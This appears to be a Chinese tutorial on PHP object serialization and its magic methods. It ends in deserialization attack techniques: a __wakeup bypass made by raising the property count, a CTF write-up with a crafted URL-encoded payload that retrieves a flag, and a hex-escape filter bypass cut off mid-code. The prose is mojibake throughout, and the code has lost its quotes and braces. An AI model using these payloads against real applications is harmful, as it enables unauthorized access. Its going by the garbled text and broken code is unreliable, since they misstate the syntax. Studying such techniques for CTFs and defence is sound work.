é€šè¿‡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨PHPä¸­è¿›è¡Œå¯¹è±¡çš„ä¼ é€’ã€‚æœ¬è´¨ä¸Šååºåˆ—åŒ–æ˜¯æ²¡æœ‰å±å®³çš„ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·å¯¹æ•°æ®å¯æ§é‚£å°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ„é€ payloadæ”»å‡»ã€‚è¿™æ ·è¯´å¯èƒ½è¿˜ä¸æ˜¯å¾ˆå…·ä½“ï¼Œä¸¾ä¸ªåˆ—å­æ¯”å¦‚ä½ ç½‘è´­ä¹°ä¸€ä¸ªæ¶å­ï¼Œå‘è´§ä¸ºèŠ‚çœæˆæœ¬ï¼Œæ˜¯æ‹†å¼€ç»™ä½ å‘è¿‡å»ï¼Œåˆ°ä½ æ‰‹ä¸Šï¼Œç„¶åç»™ä½ è¯´æ˜ä¹¦è®©ä½ ç»„è£…ï¼Œæ‹†å¼€ç»™ä½ è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¯´æ˜¯åºåˆ—åŒ–ï¼Œä½ ç»„è£…çš„è¿‡ç¨‹å°±æ˜¯ååºåˆ—åŒ– åºåˆ—åŒ–é¦–å…ˆæ¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å°æ®µéƒ½ç”±; éš”å¼€, ä½¿ç”¨è¡¨ç¤ºå±‚çº§å…³ç³» æ•°æ®ç±»å‹ æç¤ºç¬¦ æ ¼å¼ å­—ç¬¦ä¸² s s:é•¿åº¦:â€å†…å®¹â€ å·²è½¬ä¹‰å­—ç¬¦ä¸² S s:é•¿åº¦:â€è½¬ä¹‰åçš„å†…å®¹â€ æ•´æ•° i i:æ•°å€¼ å¸ƒå°”å€¼ b b:1 true b:0 false ç©ºå€¼ N N; æ•°ç»„ a a:å¤§å°:{é”®åºåˆ—æ®µ;å€¼åºåˆ—æ®µ;é‡å¤å¤šæ¬¡} å¯¹è±¡ O O:ç±»å‹åé•¿åº¦:â€ç±»å‹åç§°â€:æˆå‘˜æ•°:{æˆå‘˜åç§°åºåˆ—æ®µ;æˆå‘˜å€¼åºåˆ—æ®µ:} å¼•ç”¨ R R:ååºåˆ—åŒ–å˜é‡çš„åºå·, ä»1å¼€å§‹ ä¾‹å­å¦‚ä¸‹ï¼š class Kengwang public $name = kengwang; public $age = 18; public $sex = true; public $route = LearningRoute::Web; public $tag = array(dino, cdut, chengdu); public $girlFriend = null; private $pants = red; // not true åºåˆ—åŒ–åå¦‚ä¸‹æ‰€ç¤ºï¼ˆä¸‹é¢ç»è¿‡æ•´ç†ï¼Œä¸€èˆ¬éƒ½ä¸ºä¸€è¡Œï¼‰ï¼š O:8:Kengwang:7: // å®šä¹‰äº†ä¸€ä¸ªå¯¹è±¡ [O], å¯¹è±¡åç§°é•¿åº¦ä¸º [8], å¯¹è±¡ç±»å‹æ•°ä¸º [7] s:4:name;s:8:kengwang; // ç¬¬ä¸€ä¸ªå­—æ®µåç§°æ˜¯[4]ä¸ªé•¿åº¦çš„name, å€¼ä¸ºé•¿åº¦ä¸º[8]çš„å­—ç¬¦ä¸²([s]) kengwang s:3:age;i:18; // ç¬¬äºŒä¸ªå­—æ®µåç§°æ˜¯é•¿åº¦ä¸º[3]çš„age, å€¼ä¸ºæ•´æ•°å‹([i]): 18 s:3:sex;b:1; // ç¬¬ä¸‰ä¸ªå­—æ®µåç§°æ˜¯é•¿åº¦ä¸º[3]çš„sex, å€¼ä¸ºå¸ƒå°”å‹([b]): 1 - true s:5:route;E:17:LearningRoute:Web; // ç¬¬å››ä¸ªå­—æ®µåç§°æ˜¯é•¿åº¦ä¸º[5]çš„route, å€¼ä¸ºæšä¸¾ç±»å‹([E]), æšä¸¾å€¼é•¿åº¦ä¸º [17], å€¼ä¸º ...: s:3:tag;a:3: // é•¿åº¦ä¸º [3] çš„æ•°ç»„([a]) i:0;s:4:dino; // ç¬¬[0]ä¸ªå…ƒç´  i:1;s:4:cdut; i:2;s:7:chengdu; s:10:girlFriend;N; // å­—æ®µ girlFriend ä¸º NULL\ts:15: Kengwang pants;s:3:red; // ç§æœ‰å­—æ®µåç§°ä¸º ç±»å‹å å­—æ®µå, å…¶ä¸­ç±»å‹åç”¨ NULL å­—ç¬¦åŒ…è£¹ å…³äºéå…¬æœ‰å­—æ®µåç§°(\\x00å…¶å®å°±æ˜¯ç©ºæ ¼ï¼‰: private ä½¿ç”¨: ç§æœ‰çš„ç±»çš„åç§° (è€ƒè™‘åˆ°ç»§æ‰¿çš„æƒ…å†µ) å’Œå­—æ®µåç»„åˆ \\x00ç±»åç§°\\x00å­—æ®µå protected ä½¿ç”¨: * å’Œå­—æ®µåç»„åˆ \\x00*\\x00å­—æ®µå é­”æœ¯æ–¹æ³•__constructï¼ˆç¬”è®°phpæœ‰è¯¦ç»†è§£é‡Šï¼‰æ„é€ å‡½æ•°, åœ¨å¯¹åº”å¯¹è±¡å®ä¾‹åŒ–æ—¶è‡ªåŠ¨è¢«è°ƒç”¨. å­ç±»ä¸­çš„æ„é€ å‡½æ•°ä¸ä¼šéšå¼è°ƒç”¨çˆ¶ç±»çš„æ„é€ å‡½æ•° __wakeupä¸ sleep () æ–¹æ³•ç›¸æ¯”ï¼Œwakeup () æ–¹æ³•é€šå¸¸ç”¨äºååºåˆ—åŒ–æ“ä½œï¼Œä¾‹å¦‚é‡å»ºæ•°æ®åº“è¿æ¥æˆ–æ‰§è¡Œå…¶ä»–åˆå§‹åŒ–æ“ä½œã€‚ ?phpclass Person public $sex; public $name; public $age; public function __construct($name=, $age=25, $sex=Male) $this-name = $name; $this-age = $age; $this-sex = $sex; public function __sleep() echo It is called when the serialize() method is called outside the class.br; $this-name = base64_encode($this-name); return array(name, age); //å®ƒå¿…é¡»è¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼çš„å…ƒç´ æ˜¯è¿”å›çš„å±æ€§çš„åç§° public function __wakeup() echo It is called when the unserialize() method is called outside the class.br; $this-name = 2; $this-sex = Male; // There is no need to return an array here. $person = new Person(John);var_dump(serialize($person));//var_dump():ä»¥æ˜“äºé˜…è¯»çš„æ–¹å¼æ˜¾ç¤ºå˜é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»å‹ã€é•¿åº¦å’Œå€¼var_dump(unserialize(serialize($person)));ä»£ç è¿è¡Œç»“æœå¦‚ä¸‹ï¼šIt is called when the serialize() method is called outside the class.string(58) O:6:Person:2:s:4:name;s:8:5bCP5piO;s:3:age;i:25;It is called when the unserialize() method is called outside the class.object(Person)#2 (3) [sex]= string(3) Male [name]= int(2) [age]= int(25) __sleepserialize () æ–¹æ³•å°†æ£€æŸ¥ç±»ä¸­æ˜¯å¦æœ‰é­”æœ¯æ–¹æ³•__sleep ()ã€‚å¦‚æœå­˜åœ¨ï¼Œå°†é¦–å…ˆè°ƒç”¨è¯¥æ–¹æ³•ï¼Œç„¶åæ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚ __sleep () æ–¹æ³•é€šå¸¸ç”¨äºæŒ‡å®šä¿å­˜æ•°æ®ä¹‹å‰éœ€è¦åºåˆ—åŒ–çš„å±æ€§ã€‚å¦‚æœæœ‰ä¸€äº›éå¸¸å¤§çš„å¯¹è±¡ä¸éœ€è¦å…¨éƒ¨ä¿å­˜ï¼Œé‚£ä¹ˆæ‚¨ä¼šå‘ç°æ­¤åŠŸèƒ½éå¸¸æœ‰ç”¨ã€‚ ?phpclass Person public $sex; public $name; public $age; public function __construct($name=, $age=25, $sex=Male) $this-name = $name; $this-age = $age; $this-sex = $sex; public function __sleep() echo It is called when the serialize() method is called outside the class.br; $this-name = base64_encode($this-name); return array(name, age); //å®ƒå¿…é¡»è¿”å›ä¸€ä¸ªå€¼ï¼Œè¯¥å€¼çš„å…ƒç´ æ˜¯è¿”å›çš„å±æ€§çš„åç§° $person = new Person(John); // Initially assigned.echo serialize($person);echo br/;æ˜¾ç¤ºç»“æœå¦‚ä¸‹ï¼šIt is called when the serialize() method is called outside the class.O:6:Person:2:s:4:name;s:8:5bCP5piO;s:3:age;i:25; __toStringåªè¦å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ¥ç”¨ï¼Œå°±ä¼šè°ƒç”¨__toString () æ–¹æ³•ã€‚ æˆ–è€…è¯´æ˜¯å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºstringæ—¶ï¼Œä¹Ÿä¼šè°ƒç”¨è¯¥æ–¹æ³•ï¼š$a = (string)$objï¼Œå…¶ä¸­$objä¸ºä¸€ä¸ªå¯¹è±¡ å†ä¸¾ä¸ªä¾‹å­ï¼Œevalå‡½æ•°çš„å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œå½“eval($obj)æ—¶ï¼Œä¾¿ä¼šè‡ªåŠ¨è°ƒåŠ¨__toString()æ–¹æ³• ä½†æ˜¯è¦æ³¨æ„ï¼Œåœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨(string)æ–¹æ³•çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨__tostringæ–¹æ³•çš„è¯å°±å¿…é¡»è¦ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œæ¯”å¦‚å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼š.$obj æ³¨æ„ï¼šæ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†åœ¨ E_RECOVERABLE_ERROR çº§åˆ«ä¸Šå¼•å‘è‡´å‘½é”™è¯¯ã€‚è€Œä¸”æ‚¨ä¹Ÿä¸èƒ½åœ¨__toString () æ–¹æ³•ä¸­æŠ›å‡ºå¼‚å¸¸ public function __toString() return go go go; å½“ç„¶, å› ä¸º PHP æ˜¯ä¸€ä¸ªå¼±ç±»å‹è¯­è¨€, å¾ˆå¤šæƒ…å†µå¯¹è±¡ä¼šè¢«éšå¼è½¬æ¢æˆå­—ç¬¦ä¸², æ¯”å¦‚è¯´ == ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ä¼šè¢«éšå¼è½¬æ¢ å­—ç¬¦ä¸²æ“ä½œ (strç³»åˆ—å‡½æ•°), å­—ç¬¦ä¸²æ‹¼æ¥, addslashes ä¸€äº›å‚æ•°éœ€è¦ä¸ºå­—ç¬¦ä¸²çš„å‚æ•°: class_exists , in_array(ç¬¬ä¸€ä¸ªå‚æ•°), SQL é¢„ç¼–è¯‘è¯­å¥, md5, sha1ç­‰ print, echo å‡½æ•° __getå½“è¯•å›¾è®¿é—®å¯¹è±¡ä¸­æœªå®šä¹‰æˆ–ä¸å¯è§çš„å±æ€§æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ ä¾‹å­å¦‚ä¸‹ï¼š ?phpclass Person private $name; private $age; function __construct($name=, $age=1) $this-name = $name; $this-age = $age; public function __get($propertyName) if ($propertyName == age) if ($this-age 30) return $this-age - 10; else return $this-$propertyName; else return $this-$propertyName; $Person = new Person(John, 60);echo Nameï¼š . $Person-name . br;echo Ageï¼š . $Person-age . br; æ˜¾ç¤ºç»“æœå¦‚ä¸‹ï¼šName: JohnAge: 50 __setå½“ä½ å°è¯•ç»™ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§ï¼ˆä¾‹å¦‚ç§æœ‰å±æ€§æˆ–ä¸å­˜åœ¨çš„å±æ€§ï¼‰èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ set ($property,$value) æ–¹æ³•ç”¨äºè®¾ç½®ç±»çš„ç§æœ‰å±æ€§ã€‚åˆ†é…äº†æœªå®šä¹‰çš„å±æ€§åï¼Œå°†è§¦å‘ set () æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ é€’çš„å‚æ•°æ˜¯è®¾ç½®çš„å±æ€§åç§°å’Œå€¼ã€‚ä¾‹å­å¦‚ä¸‹ï¼š ?phpclass Person private $name; private $age; public function __construct($name=, $age=25) $this-name = $name; $this-age = $age; public function __set($property, $value) if ($property==age) if ($value 150 || $value 0) return; $this-$property = $value; public function say() echo My name is .$this-name.,Im .$this-age. years old; $Person=new Person(John, 25); //è¯·æ³¨æ„ï¼Œç±»åˆå§‹åŒ–å¹¶ä¸ºâ€œnameâ€å’Œâ€œageâ€åˆ†é…åˆå§‹å€¼ã€‚$Person-name = Lili; // name å±æ€§å€¼è¢«æˆåŠŸä¿®æ”¹ã€‚å¦‚æœæ²¡æœ‰__set()æ–¹æ³•ï¼Œç¨‹åºå°†æŠ¥é”™ã€‚$Person-age = 16; // ageå±æ€§ä¿®æ”¹æˆåŠŸã€‚$Person-age = 160; //160æ˜¯æ— æ•ˆå€¼ï¼Œå› æ­¤ä¿®æ”¹å¤±è´¥ã€‚$Person-say(); //è¾“å‡º:My name is Lili, Im 16 years oldã€‚ __invokeæŠŠå¯¹è±¡å½“åšå‡½æ•°è°ƒç”¨æ—¶ä¼šä½¿ç”¨, ä¾‹å¦‚ $foo() å½“ç„¶ä¸ä»…é™äºæ˜¾å¼è°ƒç”¨, å°†å…¶ä½œä¸ºå›è°ƒå‡½æ•° (ä¾‹å¦‚ array_mapä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥) ä¹Ÿä¼šè°ƒç”¨æ­¤å‡½æ•° ?phpclass Person public $sex; public $name; public $age; public function __construct($name=, $age=25, $sex=Male) $this-name = $name; $this-age = $age; $this-sex = $sex; public function __invoke() echo This is an object; $person = new Person(John); // Initially assigned.$person();æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼šThis is an object å¦‚æœåšæŒä½¿ç”¨å¯¹è±¡ä½œä¸ºæ–¹æ³• (ä½†æœªå®šä¹‰__invoke () æ–¹æ³•)ï¼Œä¼šæŠ¥é”™ __callè°ƒç”¨æœªå®šä¹‰æ–¹æ³•æ—¶ä¼šè°ƒç”¨ è¯¥æ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæœªå®šä¹‰çš„æ–¹æ³•åç§°ï¼Œç¬¬äºŒä¸ªå‚æ•°åˆ™ä¸ºä¼ å…¥æ–¹æ³•çš„å‚æ•°æ„æˆçš„æ•°ç»„ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š function __call(string $function_name, array $arguments) // method body å®ä¾‹ï¼š ?phpclass Person function say() echo Hello, world!br; function __call($funName, $arguments) echo The function you calledï¼š . $funName . (parameterï¼š ; // Print the methods name that is not existed. print_r($arguments); // Print the parameter list of the method that is not existed. echo )does not exist!ï¼br ; $Person = new Person(); $Person-run(teacher); // If the method which is not existed is called within the object, then the __call() method will be called automatically.$Person-eat(John, apple); $Person-say();æ˜¾ç¤ºç»“æœThe function you called: run (parameter: Array([0] = teacher)) does not exist!The function you called: eat (parameter: Array([0] = John[1] = apple)) does not exist!Hello world! __callStatic()å½“åœ¨ç¨‹åºä¸­è°ƒç”¨æœªå®šä¹‰çš„é™æ€æ–¹æ³•ï¼Œ__callStatic() æ–¹æ³•å°†ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ __callStatic()çš„ç”¨æ³•ç±»ä¼¼äº__call()ï¼Œä¾‹å­ä»£ç ä¸ä¸Šé¢ä¾‹å­çš„åŸºæœ¬ç›¸ä¼¼ï¼Œå…¶ä¸­çš„ ::ä»£è¡¨è°ƒç”¨é™æ€æ–¹æ³• $Person::run(teacher); // å¦‚æœæ­¤é¡¹ç›®å†…ä¸å­˜åœ¨çš„æ–¹æ³•è¢«è°ƒç”¨äº†ï¼Œé‚£ä¹ˆ __callStatic() æ–¹æ³•å°†è¢«è‡ªåŠ¨è°ƒç”¨ã€‚$Person::eat(John, apple); __issetå¦‚æœåœ¨å¯¹è±¡å¤–éƒ¨ä½¿ç”¨ isset () æ–¹æ³•ï¼Œåˆ™æœ‰ä¸¤ç§æƒ…å†µï¼š å¦‚æœè¯¥å‚æ•°æ˜¯å…¬å…±å±æ€§ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ isset () æ–¹æ³•ç¡®å®šæ˜¯å¦è®¾ç½®äº†è¯¥å±æ€§ã€‚ å¦‚æœå‚æ•°æ˜¯ç§æœ‰å±æ€§ï¼Œåˆ™ isset () æ–¹æ³•å°†ä¸èµ·ä½œç”¨ã€‚å½“ç„¶ï¼Œåªè¦åœ¨ç±»ä¸­å®šä¹‰__isset () æ–¹æ³•ï¼Œå°±å¯ä»¥åœ¨ç±»å¤–éƒ¨ä½¿ç”¨ isset () æ–¹æ³•æ¥ç¡®å®šæ˜¯å¦è®¾ç½®äº†ç§æœ‰å±æ€§ã€‚ å½“åœ¨æœªå®šä¹‰æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset () æˆ– empty () æ—¶ï¼Œå°†è°ƒç”¨__isset () æ–¹æ³•ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š public function __isset($content) echo The $content property is privateï¼Œthe __isset() method is called automatically.br; echo isset($this-$content); __unsetä¸ isset () æ–¹æ³•ç±»ä¼¼ï¼Œå½“åœ¨æœªå®šä¹‰æˆ–ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ unset () æ–¹æ³•æ—¶ï¼Œå°†è°ƒç”¨ unset () æ–¹æ³• public function __unset($content) echo It is called automatically when we use the unset() method outside the class.br; echo isset($this-$content); $person = new Person(John, 25); // Initially assigned.unset($person-sex),br;unset($person-name),br;unset($person-age),br; __debugInfoå½“æ‰§è¡Œ var_dump() æ–¹æ³•æ—¶ï¼Œ__debugInfo() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚å¦‚æœ __debugInfo() æ–¹æ³•æœªè¢«å®šä¹‰ï¼Œé‚£ä¹ˆ var_dump æ–¹æ³•æˆ–æ‰“å°å‡ºè¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ ?phpclass C private $prop; public function __construct($val) $this-prop = $val; public function __debugInfo() return [ propSquared = $this-prop ** 2, ]; //è¿”å›å¿…é¡»æ˜¯æ•°ç»„var_dump(new C(42));æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼šobject(C)#1 (1) [propSquared]= int(1764) __set_state () ï¼ˆä¸æ‡‚ï¼‰ä» PHP 5.1.0 å¼€å§‹ï¼Œåœ¨è°ƒç”¨ var_export () å¯¼å‡ºç±»ä»£ç æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__set_state () æ–¹æ³•ã€‚ __set_state () æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰å±æ€§å€¼çš„æ•°ç»„ï¼Œå…¶æ ¼å¼ä¸º array (â€˜propertyâ€™ valueï¼Œâ€¦) åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œæ²¡æœ‰å®šä¹‰__set_state () æ–¹æ³•ï¼š ?phpclass Person public $sex; public $name; public $age; public function __construct($name=, $age=25, $sex=Male) $this-name = $name; $this-age = $age; $this-sex = $sex; $person = new Person(John);var_export($person);æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼šPerson::__set_state(array( sex = Male, name = John, age = 25, )) å®šä¹‰__set_state () æ–¹æ³•ï¼š public static function __set_state($an_array) $a = new Person(); $a-name = $an_array[name]; return $a; $person = new Person(John);$person-name = Jams;var_export($person);æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼šPerson::__set_state(array( sex = Male, name = Jams, age = 25, )) __clone()åœ¨ PHP ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ clone å…³é”®å­—é€šè¿‡ä»¥ä¸‹è¯­æ³•å…‹éš†å¯¹è±¡ï¼š $copy_of_object = clone $object; ä½†æ˜¯ï¼Œä½¿ç”¨ clone å…³é”®å­—åªæ˜¯ä¸€ä¸ªæµ…æ‹·è´ï¼Œå› ä¸ºæ‰€æœ‰å¼•ç”¨çš„å±æ€§ä»å°†æŒ‡å‘åŸå§‹å˜é‡ã€‚ å¦‚æœåœ¨å¯¹è±¡ä¸­å®šä¹‰äº† clone () æ–¹æ³•ï¼Œåˆ™å°†åœ¨å¤åˆ¶ç”Ÿæˆçš„å¯¹è±¡ä¸­è°ƒç”¨ clone () æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ç”¨äºä¿®æ”¹å±æ€§çš„å€¼ (å¦‚æœ‰å¿…è¦) ?phpclass Person public $sex; public $name; public $age; public function __construct($name=, $age=25, $sex=Male) $this-name = $name; $this-age = $age; $this-sex = $sex; public function __clone() echo __METHOD__.your are cloning the object.br; //$this-name = Joe //å¤åˆ¶å¯¹è±¡æ—¶é‡ç½®å§“åä¸ºJoe $person = new Person(John); // Initially assigned.$person2 = clone $person;var_dump(persion1:);var_dump($person);echo br;var_dump(persion2:);var_dump($person2);è¿è¡Œç»“æœå¦‚ä¸‹ï¼šPerson::__clone your are cloning the object.string(9) persion1: object(Person)#1 (3) [sex]= string(3) Male [name]= string(6) John [age]= int(25) string(9) persion2: object(Person)#2 (3) [sex]= string(3) Male [name]= string(6) John [age]= int(25) __autoload ()__autoload () æ–¹æ³•å¯ä»¥å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»ã€‚ è¿‡å»ï¼Œå¦‚æœè¦åœ¨ç¨‹åºæ–‡ä»¶ä¸­åˆ›å»º 100 ä¸ªå¯¹è±¡ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ include () æˆ– require () æ¥åŒ…å« 100 ä¸ªç±»æ–‡ä»¶ï¼Œæˆ–è€…å¿…é¡»åœ¨åŒä¸€ç±»æ–‡ä»¶ä¸­å®šä¹‰ 100 ä¸ªç±»;é‚£ä¹ˆä½¿ç”¨__autoload () æ–¹æ³•å‘¢ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š /** * file autoload_demo.php */function __autoload($className) $filePath = â€œproject/class/$className.phpâ€; if (is_readable($filePath)) require($filePath); if (ConditionA) $a = new A(); $b = new B(); $c = new C(); // â€¦ else if (ConditionB) $a = newA(); $b = new B(); // â€¦ å½“ PHP å¼•æ“ç¬¬ä¸€æ¬¡ä½¿ç”¨ç±» A æ—¶ï¼Œå¦‚æœæœªæ‰¾åˆ°ç±» Aï¼Œåˆ™ autoload æ–¹æ³•å°†è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶ä¸”ç±»åç§° â€œAâ€ å°†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åœ¨ autoload () æ–¹æ³•ä¸­éœ€è¦åšçš„æ˜¯æ ¹æ®ç±»åæ‰¾åˆ°ç›¸åº”çš„ç±»æ–‡ä»¶ï¼Œç„¶åå°†å…¶åŒ…å«åœ¨å†…ã€‚å¦‚æœæ‰¾ä¸åˆ°è¯¥æ–‡ä»¶ï¼Œåˆ™ php å¼•æ“å°†æŠ›å‡ºå¼‚å¸¸ __unserialize() __unserialize() æ˜¯ PHP 7.4 å¼•å…¥çš„æ–¹æ³•ï¼Œæä¾›äº†ä¸€ç§æ›´å®‰å…¨ã€æ›´çµæ´»çš„æ–¹å¼æ¥æ§åˆ¶å¯¹è±¡ååºåˆ—åŒ–è¿‡ç¨‹ã€‚å®ƒå…è®¸å¼€å‘è€…å¤„ç†ä»åºåˆ—åŒ–å­—ç¬¦ä¸²æ¢å¤å¯¹è±¡æ—¶çš„å…·ä½“é€»è¾‘ å¦‚æœç±»ä¸­å®šä¹‰äº† __unserialize() æ–¹æ³•ï¼š å½“ä½¿ç”¨ unserialize() å‡½æ•°ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œ__unserialize() æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ è¿™æ˜¯å› ä¸º __unserialize() æä¾›äº†æ›´ç›´æ¥çš„æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹çš„æ–¹å¼ï¼Œä¼˜å…ˆçº§é«˜äº __wakeup()ã€‚ å¦‚æœç±»ä¸­æœªå®šä¹‰ __unserialize() æ–¹æ³•ï¼š å½“ä½¿ç”¨ unserialize() å‡½æ•°ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œå¦‚æœ __unserialize() ä¸å­˜åœ¨ä½† __wakeup() å­˜åœ¨ï¼Œé‚£ä¹ˆ __wakeup() ä¼šè¢«è°ƒç”¨ã€‚ é­”æœ¯æ–¹æ³•æ‰§è¡Œé¡ºåºå¯¹äºé­”æœ¯æ–¹æ³•çš„è°ƒç”¨é¡ºåº, ä¸åŒçš„æƒ…å†µä¸‹ä¼šæœ‰ä¸åŒçš„é¡ºåº é¦–å…ˆ, ä¸€ä¸ªå¯¹è±¡åœ¨å…¶ç”Ÿå‘½å‘¨æœŸä¸­ä¸€å®šä¼šèµ°è¿‡ destruct, åªæœ‰å½“å¯¹è±¡æ²¡æœ‰è¢«ä»»ä½•å˜é‡æŒ‡å‘æ—¶æ‰ä¼šè¢«å›æ”¶ å½“ä½¿ç”¨ new å…³é”®å­—æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè°ƒç”¨ construct å¯¹äºåºåˆ—åŒ–ååºåˆ—åŒ–æ—¶çš„æƒ…å†µ: åºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨ sleep å†è°ƒç”¨ destruct, æ•…è€Œå®Œæ•´çš„è°ƒç”¨é¡ºåºä¸º: sleep - (å˜é‡å­˜åœ¨) - destruct ååºåˆ—åŒ–æ—¶å¦‚æœæœ‰ __wakeup åˆ™ä¼šè°ƒç”¨ __wakeUp è€Œä¸æ˜¯ __construct, æ•…è€Œé€»è¾‘ä¸º __wakeUp/__construct - (å˜é‡å­˜åœ¨) å½“ç„¶ï¼Œä¹Ÿæœ‰ä¸éµå®ˆè¿™ä¸ªé¡ºåºçš„æƒ…å†µ ç»•è¿‡éå…¬æœ‰å­—æ®µç»•è¿‡å¯¹äº php7.1+ ç‰ˆæœ¬, ååºåˆ—åŒ–æ—¶è‹¥æä¾›çš„å‘½åä¸ºå…¬æœ‰å­—æ®µæ ¼å¼, ä¼šå¿½ç•¥æ‰éå…¬æœ‰å­—æ®µçš„è®¿é—®æ€§, è€Œå¯ä»¥ç»•è¿‡ç›´æ¥ç›´æ¥å¯¹å…¶èµ‹å€¼ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥ åœ¨å†™åºåˆ—åŒ– php æ–‡ä»¶æ—¶å¯ä»¥ç›´æ¥å°†å­—æ®µæ”¹æˆ public ä¿®æ”¹åºåˆ—åŒ–åçš„å­—æ®µå, æ”¹ä¸ºå…¬å¼€å­—æ®µçš„æ ·å¼, è®°å¾—ä¿®æ”¹å­—ç¬¦æ•° ç»•è¿‡ __wakeupå½±å“ç‰ˆæœ¬php55.6.25,php77.010 ç®€å•æè¿°å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ ä¾‹å¦‚: O:4:Dino:1:s:4:addr;s:3:209; æ”¹ä¸º: O:4:Dino:114514:s:4:addr;s:3:209; [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP __wakeup()ç»•è¿‡?php include class.php;$select = $_GET[select]; $res=unserialize(@$select);?php include flag.php; error_reporting(0); class Name private $username = nonono; private $password = yesyes; public function __construct($username,$password) $this-username = $username; $this-password = $password; function __wakeup() $this-username = guest; function __destruct() if ($this-password != 100) echo /brNO!!!hacker!!!/br; echo You name is: ; echo $this-username;echo /br; echo You password is: ; echo $this-password;echo /br; die(); if ($this-username === admin) global $flag; echo $flag; else echo /brhello my friend~~/brsorry i cant give you the flag!; die(); çœ‹æºç æˆ‘ä»¬éœ€è¦password100,usernameadmin,ä½†ååºåˆ—åŒ–è¿‡ç¨‹ä¸­wakeupæ–¹æ³•é‡Œä¼šæŠŠusernameèµ‹å€¼ä¸ºguestï¼› ?php class Name private $username = admin; private $password = 100; public function __construct($username,$password) $this-username = $username; $this-password = $password; $a=new Name(admin,100); echo urlencode(serialize($a)); //echo serialize($a); //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D ? å…ˆç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶ååºåˆ—åŒ–ï¼Œä¿®æ”¹å¯¹è±¡ä¸ªæ•°ä¸ºå¤§äº2å¹¶Urlç¼–ç ï¼Œå¥—åˆ°é¢˜ç›®é‡Œé¢å»ï¼Œå¾—åˆ°flag åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦åŒ¹é…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶æ­é…ä¸Šå·²è½¬ä¹‰å­—ç¬¦ä¸²æ¥ç»•è¿‡å¯¹æŸäº›å­—ç¬¦çš„æ£€æµ‹ï¼Œä¾‹å­å¦‚ä¸‹ï¼š ?phpclass Read public $name; public function __wakeup() if ($this-name == flag) echo You did it!; $str = ;if (strpos($str, flag) === false) $obj = unserialize($str);else 